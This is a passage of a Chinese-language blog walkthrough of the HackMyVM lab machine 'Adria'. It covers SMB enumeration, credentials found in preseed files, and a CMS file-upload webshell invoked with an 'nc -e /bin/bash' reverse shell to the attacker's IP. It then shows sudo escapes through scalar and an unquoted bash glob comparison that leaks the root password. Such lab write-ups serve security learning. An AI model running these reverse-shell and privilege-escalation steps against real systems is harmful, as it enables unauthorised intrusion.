+</span></span><span class="line"><span class="cl">└─$ smbclient  //192.168.31.102/DebianShare 
+</span></span><span class="line"><span class="cl">Password for [WORKGROUP\kali]:
+</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \&gt; ls
+</span></span><span class="line"><span class="cl">  .                                   D        0  Mon Dec  4 17:32:45 2023
+</span></span><span class="line"><span class="cl">  ..                                  D        0  Sat Jul 22 16:10:13 2023
+</span></span><span class="line"><span class="cl">  configz.zip                         N  2756857  Mon Nov  6 23:56:25 2023
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                19480400 blocks of size 1024. 15686980 blocks available
+</span></span><span class="line"><span class="cl">smb: \&gt; get configz.zip
+</span></span><span class="line"><span class="cl">getting file \configz.zip of size 2756857 as configz.zip (26655.8 KiloBytes/sec) (average 26655.9 KiloBytes/sec)
+</span></span><span class="line"><span class="cl">smb: \&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看zip里面有什么，解压看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Desktop]
+</span></span><span class="line"><span class="cl">└─$ cd configz 
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Desktop/configz]
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">boot  isolinux  preseed
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Desktop/configz]
+</span></span><span class="line"><span class="cl">└─$ grep -r &#34;user&#34;    
+</span></span><span class="line"><span class="cl">preseed/master.preseed:d-i passwd/user-fullname string admin
+</span></span><span class="line"><span class="cl">preseed/master.preseed:d-i passwd/username string admin
+</span></span><span class="line"><span class="cl">preseed/master.preseed:d-i passwd/user-password password jojo1989
+</span></span><span class="line"><span class="cl">preseed/master.preseed:d-i user-setup/allow-password-weak boolean true
+</span></span><span class="line"><span class="cl">preseed/master.seed:# To create a normal user account.
+</span></span><span class="line"><span class="cl">preseed/master.seed:d-i passwd/user-fullname string Adam Lewis
+</span></span><span class="line"><span class="cl">preseed/master.seed:d-i passwd/username string alewis
+</span></span><span class="line"><span class="cl">preseed/master.seed:# Normal user&#39;s password, either in clear text
+</span></span><span class="line"><span class="cl">preseed/master.seed:#d-i passwd/user-password password insecure
+</span></span><span class="line"><span class="cl">preseed/master.seed:#d-i passwd/user-password-again password insecure
+</span></span><span class="line"><span class="cl">preseed/master.seed:d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268
+</span></span><span class="line"><span class="cl">preseed/master.seed:# Create the first user with the specified UID instead of the default.
+</span></span><span class="line"><span class="cl">preseed/master.seed:d-i passwd/user-uid string 1010
+</span></span><span class="line"><span class="cl">preseed/master.seed:#d-i user-setup/allow-password-weak boolean true
+</span></span><span class="line"><span class="cl">grep: boot/grub/x86_64-efi/legacycfg.mod: binary file matches
+</span></span><span class="line"><span class="cl">grep: boot/grub/x86_64-efi/read.mod: binary file matches
+</span></span><span class="line"><span class="cl">grep: boot/grub/x86_64-efi/password.mod: binary file matches
+</span></span><span class="line"><span class="cl">grep: boot/grub/x86_64-efi/password_pbkdf2.mod: binary file matches
+</span></span><span class="line"><span class="cl">grep: boot/grub/x86_64-efi/bsd.mod: binary file matches
+</span></span><span class="line"><span class="cl">grep: boot/grub/efi.img: binary file matches
+</span></span><span class="line"><span class="cl">grep: isolinux/libcom32.c32: binary file matches
+</span></span><span class="line"><span class="cl">isolinux/ks.cfg:#Initial user
+</span></span><span class="line"><span class="cl">isolinux/ks.cfg:user cscience --fullname &#34;Coin Science&#34; --iscrypted --password $1$cw7eQ/70$/8ZeZKBBBJPtIFdnibj/X/
+</span></span><span class="line"><span class="cl">grep: isolinux/en.hlp: binary file matches
+</span></span><span class="line"><span class="cl">grep: isolinux/nb.tr: binary file matches
+</span></span><span class="line"><span class="cl">isolinux/f9.txt:and the next user who comes up with the same problem will profit from your
+</span></span><span class="line"><span class="cl">grep: isolinux/ldlinux.c32: binary file matches
+</span></span><span class="line"><span class="cl">grep: isolinux/bootlogo: binary file matches
+</span></span><span class="line"><span class="cl">grep: isolinux/si.hlp: binary file matches
+</span></span><span class="line"><span class="cl">grep: isolinux/ka.hlp: binary file matches
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用grep直接查找想要的信息admin/jojo1989
+进入后台，查找cms对应版本漏洞，是文件上传.phar，传个一句话木马上去</p>
+<blockquote>
+<p>http://192.168.31.102/uploads/shell.phar?cmd=nc%20-e%20/bin/bash%20192.168.31.183%204444</p></blockquote>
+<p>顺便/usr/bin/script -qc /bin/bash /dev/null拉个交互式终端</p>
+<h3 id="提权">提权</h3>
+<p>先看看这个能干啥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">adria</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">uploads</span><span class="o">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="n">sudo</span><span class="p">:</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">resolve</span> <span class="n">host</span> <span class="n">adria</span><span class="p">:</span> <span class="n">No</span> <span class="n">address</span> <span class="n">associated</span> <span class="n">with</span> <span class="n">hostname</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">on</span> <span class="n">adria</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">use_pty</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">adria</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">adriana</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">scalar</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>scalar虽然自身没有直接执行命令的能力，但是可以通过手动输入脚本然后像python那样逐行解释运行。
+可以在该工具的交互式输入!sh来获取adriana用户的shell</p>
+<blockquote>
+<p>sudo -u adriana /usr/bin/scalar list</p></blockquote>
+<p>得到用户权限和flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">sudo: unable to resolve host adria: No address associated with hostname
+</span></span><span class="line"><span class="cl">Matching Defaults entries for adriana on adria:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User adriana may run the following commands on adria:
+</span></span><span class="line"><span class="cl">    (ALL : ALL) NOPASSWD: /opt/backup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这次可以执行的是个backup</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /opt/backup
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span><span class="o">=</span><span class="k">$(</span>/usr/bin/cat /root/pass<span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> -ep <span class="s2">&#34;Password: &#34;</span> USER_PASS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$PASSWORD</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s2">&#34;Authorized access&#34;</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/zip -r -e -P <span class="s2">&#34;</span><span class="nv">$PASSWORD</span><span class="s2">&#34;</span> /opt/backup.zip /var/www/html
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s2">&#34;Access denied&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个脚本有一个问题，就是第7行的</p>
+<blockquote>
+<p>$PASSWORD == $USER_PASS</p></blockquote>
+<p>两个变量都没有加上引号，呈现上就是如果输入通配符<em>或者？的话会直接匹配成真,
+所以我们对于backup这个脚本也只需要输入</em>即可。只不过密码不会直接打印出来，需要起另一个进程监视后台即可</p>
+<blockquote>
+<p>watch -n 0.1 -d &ldquo;ps aux | grep -ai /usr/bin/zip&rdquo;</p></blockquote>
+<p>得到密码</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-02-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hmv_adria/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/hmv_adria/" data-title="HMV Adria" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/hmv_adria/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/hmv_adria/" data-title="HMV Adria"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/hmv_adria/" data-title="HMV Adria"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/hmv_adria/" data-title="HMV Adria"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hkcert2024/" class="prev" rel="prev" title="Hkcert2024"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hkcert2024</a>
+            <a href="/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/" class="next" rel="next" title="Hugo搭建以及主题完善">Hugo搭建以及主题完善<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
